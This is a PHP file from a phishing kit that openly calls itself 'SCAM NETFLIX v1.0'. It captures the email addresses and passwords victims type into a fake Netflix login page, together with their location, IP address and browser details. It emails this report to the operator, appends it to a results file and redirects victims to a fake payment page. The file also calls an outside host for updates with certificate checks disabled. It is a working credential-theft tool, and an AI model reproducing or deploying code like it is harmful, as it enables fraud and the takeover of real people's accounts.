<?php
/*   
   
    ───────────────────────────────────────────────────────────────────────────────────────────────────
    ─██████████████─████████──████████─██████████████─██████──██████─██████████████─████████████████───
    ─██░░░░░░░░░░██─██░░░░██──██░░░░██─██░░░░░░░░░░██─██░░██──██░░██─██░░░░░░░░░░██─██░░░░░░░░░░░░██───
    ─██░░██████████─████░░██──██░░████─██░░██████░░██─██░░██──██░░██─██░░██████████─██░░████████░░██───
    ─██░░██───────────██░░░░██░░░░██───██░░██──██░░██─██░░██──██░░██─██░░██─────────██░░██────██░░██───
    ─██░░██████████───████░░░░░░████───██░░██████░░██─██░░██████░░██─██░░██████████─██░░████████░░██───
    ─██░░░░░░░░░░██─────████░░████─────██░░░░░░░░░░██─██░░░░░░░░░░██─██░░░░░░░░░░██─██░░░░░░░░░░░░██───
    ─██████████░░██───────██░░██───────██░░██████████─██░░██████░░██─██░░██████████─██░░██████░░████───
    ─────────██░░██───────██░░██───────██░░██─────────██░░██──██░░██─██░░██─────────██░░██──██░░██─────
    ─██████████░░██───────██░░██───────██░░██─────────██░░██──██░░██─██░░██████████─██░░██──██░░██████─
    ─██░░░░░░░░░░██───────██░░██───────██░░██─────────██░░██──██░░██─██░░░░░░░░░░██─██░░██──██░░░░░░██─
    ─██████████████───────██████───────██████─────────██████──██████─██████████████─██████──██████████─
    ───────────────────────────────────────────────────────────────────────────────────────────────────
                                        #=======================#
                                        #   SCAM NETFLIX v1.0   #
                                        #    SYPHER.NETFLIX     #
                                        #=======================#
                        ─────────────────────────────────────────────────────────
                        ─██████████████─██████████████─████████───██████████████─
                        ─██░░░░░░░░░░██─██░░░░░░░░░░██─██░░░░██───██░░░░░░░░░░██─
                        ─██████████░░██─██░░██████░░██─████░░██───██░░██████░░██─
                        ─────────██░░██─██░░██──██░░██───██░░██───██░░██──██░░██─
                        ─██████████░░██─██░░██──██░░██───██░░██───██░░██████░░██─
                        ─██░░░░░░░░░░██─██░░██──██░░██───██░░██───██░░░░░░░░░░██─
                        ─██░░██████████─██░░██──██░░██───██░░██───██░░██████░░██─
                        ─██░░██─────────██░░██──██░░██───██░░██───██░░██──██░░██─
                        ─██░░██████████─██░░██████░░██─████░░████─██░░██████░░██─
                        ─██░░░░░░░░░░██─██░░░░░░░░░░██─██░░░░░░██─██░░░░░░░░░░██─
                        ─██████████████─██████████████─██████████─██████████████─
                        ─────────────────────────────────────────────────────────
   
*/
        session_start();
        error_reporting(0);
        $TIME_DATE = date('H:i:s d/m/Y');
        ########################################################
        ################ [+] INCLUDE FILES [+] #################
        ########################################################
        include('../functions/get_browser.php');
        include('../functions/get_ip.php'); 
        include('../config.php');
        ########################################################
        ######### [+] GET SCAM UPDATE NOTIFICATION [+] #########
        ########################################################
        function Mupdate(){
        $Mupdate = curl_init(); 
        curl_setopt($Mupdate, CURLOPT_URL, "https://www.sypherpk.ml/GetUpdate.php"); 
        curl_setopt($Mupdate, CURLOPT_RETURNTRANSFER, 1); 
        curl_setopt($Mupdate, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($Mupdate, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($Mupdate, CURLOPT_FOLLOWLOCATION, true);
        $UPDATE = curl_exec($Mupdate); 
        curl_close($Mupdate);
        return($UPDATE);
        }
        ########################################################
        ############# [+] SESSION INFORMATION [+] ##############
        ########################################################
        if(!empty($_POST['email'])){$_SESSION['_login_email_']    = $_POST['email'];}
        if(!empty($_POST['password'])){$_SESSION['_login_password_'] = $_POST['password'];}
        ########################################################
        ################ [+] SYPHER_MESSAGE [+] ################
        ########################################################
        $SYPHER_MESSAGE  = "<html><body>
        <div style='font-size: 13px;font-family:monospace;font-weight:700;'><br>
        ########################## <font style='color:#9c0000;'>[+] <font style='color: #0a5d00;'>SYPHER-PK NETFLIX FULLZ</font> [+]</font> ##########################<br>
        ############################# <font style='color:#9c0000;'>[+] <font style='color: #0a5d00;'> LOGIN INFORMATION </font> [+]</font> #############################<br>
        <font style='color:#9c0000;'>[+]</font> <b>DEAR, <font color='#cc1414'>".$SYPHER_NAME."</font> THIS IS YOUR LOGIN RESULT ENJOY !</b> <br>
        <font style='color:#9c0000;'>[+]</font> [Email] = <font style='color:#0070ba;'>".$_SESSION['_login_email_']."</font><br>
        <font style='color:#9c0000;'>[+]</font> [Password] = <font style='color:#0070ba;'>".$_SESSION['_login_password_']."</font><br>
        ############################# <font style='color:#9c0000;'>[+] <font style='color: #0a5d00;'> BILLING INFORMATION </font> [+]</font> ###########################<br>
        <font style='color:#9c0000;'>[+]</font> [City] = <font style='color:#0070ba;'>".$_SESSION['_LOOKUP_CITY_']."</font><br>
        <font style='color:#9c0000;'>[+]</font> [State]   = <font style='color:#0070ba;'>".$_SESSION['_LOOKUP_REGIONS_']."</font><br>
       <font style='color:#9c0000;'>[+]</font> [Zip Code] = <font style='color:#0070ba;'>".$_SESSION['_LOOKUP_ZIPCODE_']."</font><br>
        ############################## <font style='color:#9c0000;'>[+] <font style='color: #0a5d00;'> VICTIM INFORMATION </font> [+]</font> ###########################<br>
        <font style='color:#9c0000;'>[+]</font> [IP INFO] = <font style='color:#0070ba;'>https://db-ip.com/".$_SESSION['_ip_']."</font><br>
       <font style='color:#9c0000;'>[+]</font> [TIME/DATE] = <font style='color:#0070ba;'>".$TIME_DATE."</font><br>
        <font style='color:#9c0000;'>[+]</font> [BROWSER] = <font style='color:#0070ba;'>".SYPHER_Browser($_SERVER['HTTP_USER_AGENT'])." On ".SYPHER_OS($_SERVER['HTTP_USER_AGENT'])."</font><br>
        <font style='color:#9c0000;'>[+]</font> [UPDATE]    = <font style='color:#0070ba;'>".Mupdate()."</font><br>
        ############################# <font style='color:#9c0000;'>[+] <font style='color: #0a5d00;'> SYPHER-PK NETFLIX FULLZ </font> [+]</font> #######################<br>
        </div></body></html>";
        ################ [+] SYPHER_SUBJECT [+] ################
        $SYPHER_SUBJECT = "(NETFLIX)(LOGIN)(".$_SESSION['_login_email_'].")(".$_SESSION['_forlogin_'].")";
        ################ [+] SYPHER_HEADERS [+] ################
        $SYPHER_HEADERS  = "From: SYPHER-PK ☑ <no_reply@sypher-pk.ml>\n";
        $SYPHER_HEADERS .= "MIME-Version: 1.0\r\n";
        $SYPHER_HEADERS .= "Content-Type: text/html; charset=ISO-8859-1\n";
        ################## [+] SEND MAIL [+] ###################
        if(!empty($_POST['email'])){
        @mail($SYPHER_EMAIL, $SYPHER_SUBJECT, $SYPHER_MESSAGE, $SYPHER_HEADERS);
        ################## [+] TEXT RESULT [+] #################
        $MYFILE = "../../all_result/LOGIN.HTML";
        $FH = @fopen($MYFILE, 'a+');
        @fwrite($FH, $SYPHER_MESSAGE);
        @fclose($FH);}
        ################## [+] NEXT PAGE [+] ###################
        HEADER("Location: ../settings/settings.php?action=paymentAction&locale=en-".$_SESSION['_LOOKUP_CNTRCODE_']."&".md5(microtime())."&dispatch=".sha1(microtime())."");
        
?>